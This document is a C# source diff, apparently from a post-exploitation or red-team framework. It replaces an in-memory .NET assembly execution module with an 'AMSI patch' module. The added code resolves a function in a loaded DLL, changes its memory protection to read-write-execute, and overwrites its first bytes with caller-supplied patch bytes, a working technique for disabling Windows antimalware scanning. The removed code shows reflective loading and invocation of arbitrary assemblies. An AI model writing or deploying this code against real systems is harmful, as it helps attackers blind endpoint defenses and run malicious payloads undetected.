@@ -7,12 +7,10 @@ using System.Text.RegularExpressions;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 
-using System.Reflection;
 using System.ComponentModel;
-using System.Globalization;
 
 
-public class Module_execute_assembly
+public class Module_amsi_patch
 {
     public const string SUCC_CODE       = "0";
     public const string ERR_CODE        = "1";
@@ -102,95 +100,65 @@ public class Module_execute_assembly
         return arguments_parsed.ToArray();
     }
 
-    private byte[] hex2Bin(string hex)
-    {
-        if (hex.Length % 2 == 1)
-            throw new Exception("the binary key cannot have an odd number of digits");
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(
+        IntPtr lpAddress,
+        UIntPtr dwSize,
+        uint flNewProtect,
+        out uint lpflOldProtect);
+    
+    [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
+    public static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
 
-        byte[] data = new byte[hex.Length / 2];
-        for (int index = 0; index < data.Length; index++)
-        {
-            string byteValue = hex.Substring(index * 2, 2);
-            data[index] = byte.Parse(byteValue, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
-        }
-
-        return data;
-    }
-
-    public string[] doExecuteAssembly(string as_filedata, string as_namespace, string as_class, string as_method, string[] as_args)
+    public string[] doAmsPatch(string patchFunc, string patchContent, string patchFile)
     {
         string result = "";
-        
+
         try
         {
-            byte[] as_filedata_bytes = hex2Bin(as_filedata);
-            Assembly assembly = Assembly.Load(as_filedata_bytes);
-            
-            string fullTypeName = as_namespace + "." + as_class;
-            Type assembly_type = assembly.GetType(fullTypeName);
-            if (assembly_type == null)
-                return new string[]{ERR_CODE, "Type: '" + fullTypeName + "' not found in Assembly" + Environment.NewLine};
-            
-            MethodInfo assembly_method = assembly_type.GetMethod(as_method);
-            if (assembly_method == null)
-                return new string[]{ERR_CODE, "Method: '" + as_method + "' not found in Assembly Type: '" + fullTypeName + "'" + Environment.NewLine};
-            
-            object assembly_instance = Activator.CreateInstance(assembly_type);
-            
-            TextWriter originalConsoleOut = Console.Out;
-            using(StringWriter writer = new StringWriter())
+            if (!File.Exists(patchFile))
+                throw new Exception("File: '" + patchFile + "' not exists");
+
+            IntPtr ptrLibrary = LoadLibrary(patchFile);
+            if (ptrLibrary == IntPtr.Zero)
+                throw new Exception("Can't get handle from LoadLibrary");
+
+            IntPtr ptrFunctionAddress = GetProcAddress(ptrLibrary, patchFunc);
+            if (ptrFunctionAddress == IntPtr.Zero)
+                throw new Exception("Can't get handle from GetProcAddress");
+
+            UIntPtr dwSize = (UIntPtr)5;
+            uint Zero = 0;
+            if (!VirtualProtect(ptrFunctionAddress, dwSize, 0x40, out Zero))
+                throw new Exception("Can't set PAGE_EXECUTE_READWRITE with VirtualProtect");
+
+            string[] patchContentRaw = patchContent.Split(',');
+            byte[] patchContentBytes = new byte[patchContentRaw.Length];
+            for (int i = 0; i < patchContentRaw.Length; i++)
             {
-                Console.SetOut(writer);
-
-                object assembly_result = assembly_method.Invoke(assembly_instance, new object[] { as_args });
-
-                writer.Flush();
-
-                result = writer.GetStringBuilder().ToString();
+                patchContentBytes[i] = Convert.ToByte(patchContentRaw[i], 16);
             }
 
-            Console.SetOut(originalConsoleOut);
+            IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
+
+            Marshal.Copy(patchContentBytes, 0, unmanagedPointer, 6);
+            MoveMemory(ptrFunctionAddress, unmanagedPointer, 6);
+
+            result = "Function: '" + patchFunc + "' of file: " + patchFile + "' has been patched" + Environment.NewLine;
         }
-        catch (Exception ex)
+        catch(Exception ex)
         {
-            result += ex.ToString() + Environment.NewLine;
+            result += "An error has occurred in AMSI Patch: '" + ex.Message + "'" + Environment.NewLine;
             return new string[]{ERR_CODE, result};
         }
 
         return new string[]{SUCC_CODE, result};
-    }
-
-    [DllImport("shell32.dll", SetLastError = true)]
-    static extern IntPtr CommandLineToArgvW(
-        [MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine,
-        out int pNumArgs);
-
-    [DllImport("kernel32.dll")]
-    static extern IntPtr LocalFree(IntPtr hMem);
-
-    private string[] SplitArgs(string unsplitArgumentLine)
-    {
-        int numberOfArgs;
-        IntPtr ptrToSplitArgs;
-        string[] splitArgs;
-
-        ptrToSplitArgs = CommandLineToArgvW(unsplitArgumentLine, out numberOfArgs);
-
-        if (ptrToSplitArgs == IntPtr.Zero)
-            throw new ArgumentException("Unable to split argument.", new Win32Exception());
-
-        try
-        {
-            splitArgs = new string[numberOfArgs];
-            for (int i = 0; i < numberOfArgs; i++)
-                splitArgs[i] = Marshal.PtrToStringUni(Marshal.ReadIntPtr(ptrToSplitArgs, i * IntPtr.Size));
-
-            return splitArgs;
-        }
-        finally
-        {
-            LocalFree(ptrToSplitArgs);
-        }
     }
 
     public string[] execute(string[] args)
@@ -198,22 +166,12 @@ public class Module_execute_assembly
         string result = "";
         List<string> nargs = new List<string>(args);
         
-        if (nargs.Count != 5)
+        if (nargs.Count != 3)
         {
-            result += "Invalid arguments provided. Specify: <NET_ASSEMBLY> <ASSEMBLY_NAMESPACE> <ASSEMBLY_CLASS> <ASSEMBLY_METHOD> [ASSEMBLY_ARGS]" + Environment.NewLine;
+            result = "Invalid arguments provided. Specify resources to use." + Environment.NewLine;
             return new string[]{ERR_CODE, result};
         }
-
-        string[] as_args = new string[]{};
-        if (nargs[4] != "")
-        {
-            string asm_args = nargs[4];
-            if (asm_args.StartsWith("'") && asm_args.EndsWith("'"))
-                asm_args = asm_args.Substring(1, asm_args.Length-2);
-            as_args = SplitArgs(asm_args);
-        }
-
-        return doExecuteAssembly(nargs[0], nargs[1], nargs[2], nargs[3], as_args);
+        return doAmsPatch(args[0], args[1], args[2]);
     }
 
     public string[] go(string cwd, string args, string token)
@@ -247,7 +205,7 @@ public class Module_execute_assembly
 
     public static void go_dm(string cwd, string args, string token)
     {
-        Module_execute_assembly m = new Module_execute_assembly();
+        Module_amsi_patch m = new Module_amsi_patch();
         String[] results = m.go(cwd, args, token);
         Console.WriteLine(results[0]);
         Console.WriteLine(results[1]);
@@ -256,7 +214,7 @@ public class Module_execute_assembly
 
     public static void Main(string[] args)
     {
-        Module_execute_assembly m = new Module_execute_assembly();
+        Module_amsi_patch m = new Module_amsi_patch();
         String[] results = m.execute(args);
         Console.WriteLine(results[0]);
         Console.WriteLine(results[1]);
